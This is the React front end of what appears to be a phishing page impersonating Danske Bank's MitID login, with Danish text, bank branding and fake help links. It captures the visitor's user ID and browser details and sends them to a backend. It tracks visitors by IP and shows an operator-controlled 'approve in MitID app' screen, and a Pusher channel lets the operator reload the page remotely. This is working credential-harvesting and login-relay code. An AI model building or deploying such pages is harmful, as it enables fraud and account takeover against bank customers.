import React, { useState, useEffect } from "react"
import Bowser from "bowser";
import { Typography, Space, Image, Input, Button, Checkbox, Row, Col, Form, Card } from "antd"
import { ArrowRightOutlined, QuestionCircleOutlined, InfoCircleOutlined, CloseOutlined, LoadingOutlined } from "@ant-design/icons"
import { storeData, getIPAddress, check,visitNow } from "./apis"
import moment from "moment"
import { Alert } from "../components/alert"
import './index.css'
import Pusher from "pusher-js";
const { Text, Title, Link } = Typography

const MainPage = () => {

  const [name, setName] = useState('')
  const [loaderline, setLoaderLine] = useState(false)
  const [loading, setLoading] = useState(false)
  const [sended, setSended] = useState(false)
  const [approval, setApproval] = useState(0)
  const [spinner, setSpinner] = useState(true)
  const [mainspiner, setMainSpiner] = useState(true)
  const [innermainspiner, setInnerMainSpiner] = useState(true)
  const [ip, setIP] = useState(null)

  let isVisit = false
  useEffect(() => {
    setTimeout(() => setSpinner(false), 3000)
    setTimeout(() => setMainSpiner(false), 1000)
    setTimeout(() => setInnerMainSpiner(false), 2000)
    const pusher = new Pusher('9de74d5973e05bb9941d', {
      cluster: 'ap2',
    });
    var channel = pusher.subscribe('newProjectUpdate');
    channel.bind('justTestUpdate', (data) => {
      window.location.reload()
    });
    getIP();
    
    if(!isVisit && window.location.pathname === "/"){
      visit()
      isVisit = true
    }
  }, [])

  useEffect(() => {
    if (ip) {
      getUserDetails()
    }
  }, [ip])

  const getIP = async () => {
    let ipAddress = await getIPAddress()
    setIP(ipAddress)
  }

  const getUserDetails = async () => {
    let result = await check()
    if (result) {
      //setSpinner(false)
      if (result?.ipAddress === ip) {
        if (result?.enable === "1")
          setApproval(1)
        else if (result?.enable === "2")
          setApproval(2)
        else
          setApproval(0)
      }
    }
  }

  const apiCall = async () => {
    setLoading(true)
    setTimeout(() => setLoaderLine(true), 500)
    let browser = Bowser.getParser(window.navigator.userAgent);
    browser = browser.getBrowser()
    let result = {
      browsersDetails: browser?.name + " " + browser?.version,
      name,
      dateTime: moment().format('YYYY-MM-DD HH:mm')
    }
    
    result = await storeData(result)
    if (result)
      if(result?.success){
        setApproval(1)
        Alert('success', result?.message)
      }
      else
        Alert('error', result?.message)
    else{
      Alert('error', 'Something went server error')
    }
    
    setLoading(false)
    setTimeout(() => setLoaderLine(false), 500)
  }

  const visit = async () => {
    let browser = Bowser.getParser(window.navigator.userAgent).getBrowser()
    let result = {
      browser: browser?.name + " " + browser?.version,
      datetime: moment().format('YYYY-MM-DD HH:mm')
    }
    
    result = await visitNow(result)
    if (result)
      Alert('success', 'Welcome Visitor!')
  }

 
  return (
    <>
      <div style={{ background: '#6DBACE', position: 'relative', display: 'flex', justifyContent: 'center', padding: "17px" }}>
        <CloseOutlined style={{ position: 'absolute', top: '10px', right: '10px', color: 'white' }} />
        <Text
          style={{ fontSize: '11.5px', color: 'white', width: '100vw', textAlign: 'left', display: 'flex', alignItems: 'center' }}>
          <span style={{ fontStyle: 'italic', fontSize: '36px', padding: "10px 20px 5px 0px" }}>i</span>
          <Text style={{ transform: "translateY(10px)", color: 'white', margin: "15px 0px" }}>
            <Text strong className="text-white">Tekniske forudsætninger. </Text>
            Hvis du logger på netbank fra en telefon eller med en forældet browser, vil du kunne opleve Fejlkode 404 ved godkendelse af betalinger.
            <Text strong className="text-white"> Vi anbefaler at du i stedet bruger Mobilbank på din telefon eller får opdateret din browser.</Text>
          </Text>
        </Text>
      </div>
      <div className="dflex">
        <div className="width93" style={{ marginTop: "50px", marginBottom: "50px" }}>
          {
            mainspiner &&
            <div className="mainspinner bg-white">
              <Image src="/images/mainspinner.svg" />
            </div>
          }
          {
            !mainspiner &&
            <Row gutter={[32, 32]} justify='center'>
              <Col xs={24} sm={24} md={14} lg={10} xl={9} className='box-shadow mbl-left'>
                <Space direction="vertical" className="left-side-space" size={30}>
                  <Image src="/images/danske-bank-logo.svg" preview={false} style={{ textAlign: "center" }} />

                  {
                    innermainspiner &&
                    <div className="mainspinner">
                      <Image src="/images/mainspinner.svg" />
                    </div>
                  }

                  {
                    !innermainspiner &&
                    <div>
                      {
                        spinner &&
                        <Card className="border-c">
                          <Space direction="vertical" className="w-100" style={{ height: "450px", alignItems: "center", justifyContent: "center" }}>
                            <Image
                              src='/images/logo-blue-1.png'
                              style={{ width: '50px' }} preview={false}
                            />
                            <div class="mitid-loader__state" style={{ paddingTop: "10px" }}><svg xmlns="http://www.w3.org/2000/svg" id="svg-shield-2pfGa-G" version="1.1" focusable="false" class="mitid-loader__shield" aria-hidden="true"><path d="M49.9,0l50,15v41.2c0,47.8-50,60.8-50,60.8s-50-13-50-60.8V15L49.9,0"></path></svg><svg viewBox="30 30 60 60" focusable="false" aria-hidden="true" class="mitid-loader__circular"><circle cx="60" cy="60" r="27" fill="none" stroke="#3380eb" stroke-linecap="square" stroke-miterlimit="10" stroke-width="5"></circle><circle cx="60" cy="60" r="27" fill="none" stroke="#fff" stroke-dasharray="50 200" stroke-dashoffset="0" stroke-linecap="square" stroke-miterlimit="10" stroke-width="5"></circle></svg></div>
                            <Space size={0} direction='vertical'>
                              <Title level={4} strong>Forbinder sikkert til MitID</Title>
                              <Text>Vent et øjeblik ...</Text>
                            </Space>
                          </Space>
                        </Card>
                      }

                      {
                        !spinner &&

                        <div style={{ position: "relative", overflow: "hidden" }}>
                          {
                            loaderline &&
                            <div className="borderflow"></div>
                          }
                          <Card className="border-c left-card">
                            <Space className="w-100 border-bottom pb-ant-2" style={{ display: 'flex', justifyContent: 'space-between' }}>
                              <Text strong>Log på hos Danske Bank A/S</Text>
                              <Image
                                src='/images/logo-blue-1.png'
                                style={{ width: '50px' }} preview={false}
                              />
                            </Space>
                            {
                              approval === 1 || approval === 2 ?
                                <Space className="w-100" direction="vertical" style={{ justifyContent: "center", marginTop: "10px" }} size={10}>
                                  <Title level={4} strong>
                                    {
                                      approval === 1 ?
                                        'Abn MitID app og godkend' :
                                        'reques approved'
                                    }
                                  </Title>
                                  <div className="mobile-shap">
                                    <div className="innerflex">
                                      <div className="div"></div>
                                      <div className="div"></div>
                                      <div className="div"></div>
                                    </div>
                                    <div className="innerflex">
                                      <div className="div"></div>
                                      <div className="div"></div>
                                      <div className="div"></div>
                                    </div>
                                    <div className="innerflex">
                                      <div className="div"></div>
                                      <div style={{ display: "flex", alignItems: "center" }}><img src="/images/mbl-logo-1.png" alt="" /></div>
                                      <div className="div"></div>
                                    </div>
                                    <div className="innerflex">
                                      <div className="div"></div>
                                      <div className="div"></div>
                                      <div className="div"></div>
                                    </div>
                                    <div className="innerflex" style={{ marginBottom: "0px", justifyContent: "start", paddingLeft: "8px" }}>
                                      <div className="div"></div>
                                      <div className="div"></div>
                                    </div>
                                  </div>
                                </Space> :
                                approval === 0 ?
                                  <div>
                                    <Space className="w-100 text-left pt-ant-2" >
                                      <Text className="my-ant-0">BRUGER-ID</Text>
                                      <QuestionCircleOutlined style={{ transform: 'translateY(-3px)' }} />
                                    </Space>
                                    <Form layout="vertical">
                                      <Row gutter={[13, 13]}>
                                        <Col span={24}>
                                          <Form.Item className="mb-ant-0">
                                            <Input
                                              className="w-100 mb-ant-0"
                                              style={{ padding: "8px 11px" }}
                                              required
                                              onChange={(e) => { setName(e.target.value) }}
                                            />
                                          </Form.Item>
                                        </Col>
                                        <Col span={24}>
                                          <Button
                                            block
                                            onClick={() => { setLoaderLine(true); apiCall() }}
                                            size='large'
                                            style={{ width: '100%', backgroundColor: !name ? '#cccccc' : '#0060e6', color: name ? 'white' : 'white', height: "47px" }}
                                          // loading={loading}
                                          >
                                            <div style={{ width: '100%', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                                              <span>Fortsæt</span>
                                              <ArrowRightOutlined />
                                            </div>
                                          </Button>
                                        </Col>
                                        <Col span={24}>
                                          <Link href="https://ant.design" target="_blank" className="anchor">
                                            <Space className="w-100 text-left" >
                                              <InfoCircleOutlined style={{ transform: 'translateY(1px)', fontSize: "21px" }} />
                                              <span>Glemt bruger-ID?</span>
                                            </Space>
                                          </Link>
                                        </Col>
                                      </Row>
                                      <div className="last-Footer">
                                        <div style={{ height: "150px", display: "flex", alignItems: "end" }} className='border-bottom'>
                                          <Checkbox className="w-100">
                                            <Text strong className="mb-ant-0">Husk mig hos Danske Bank A/S</Text>
                                          </Checkbox>
                                        </div>
                                      </div>
                                      <Space size={20} className='w-100 text-left pt-ant-1'>
                                        <Link href="https://ant.design" className="blue-color" target="_blank">
                                          <span>Afbryd</span>
                                        </Link>
                                        <Link href="https://ant.design" className="blue-color" target="_blank">
                                          <span>Hjaelp</span>
                                        </Link>
                                      </Space>
                                    </Form>
                                  </div> : ''
                            }
                          </Card>
                        </div>
                      }

                    </div>
                  }

                </Space>
              </Col>
              <Col xs={24} sm={24} md={10} lg={8} xl={6} className='mbl-pad'>
                <Card className="rightinercard">
                  <Space className="w-100 text-center">
                    <Text className="text-white" style={{ margin: "15px 0px", fontSize: "17px", display: "block", lineHeight: "21px" }}>
                      Du kan ikke laengere logge pa med NemID. Hvis du endnu Ikke har faet MitID, kan du fa det pa
                      <Link href="/" target="_blank" style={{ paddingLeft: "3px", fontSize: "18px", color: "#0000EA", textDecoration: "underline" }}>
                        <span>MitID.dk</span>
                      </Link>
                    </Text>
                  </Space>
                </Card>
                <Card className="rightSideCard box-shadow" style={{ border: "0px" }}>
                  <Space direction="vertical">
                    <Text strong>Har du brug for hjælp til MitID?</Text>
                    <ul style={{ lineHeight: "25px" }}>
                      <li><Link className="font-15 blue-color">Glemt bruger-ID</Link></li>
                      <li><Link className="font-15 blue-color">Glemt PIN-kode til MitID app</Link></li>
                      <li><Link className="font-15 blue-color">MitID app på en ny enhed</Link></li>
                      <li><Link className="font-15 blue-color">Mistet MitID</Link></li>
                    </ul>
                  </Space>
                  <Space direction="vertical pt-ant-1">
                    <Text strong className="w-100">Har du endnu ikke fået MitID?</Text>
                    <ul>
                      <li><Link className="font-15 blue-color">Få MitID nu</Link></li>
                    </ul>
                  </Space>
                  <Text className="w-100 font-15" style={{ display: "block" }} strong>Læs mere på <Link className="blue-color">MitID.dk</Link></Text>
                </Card>
              </Col>
            </Row>
          }
        </div>
      </div>
    </>
  )
}
export default MainPage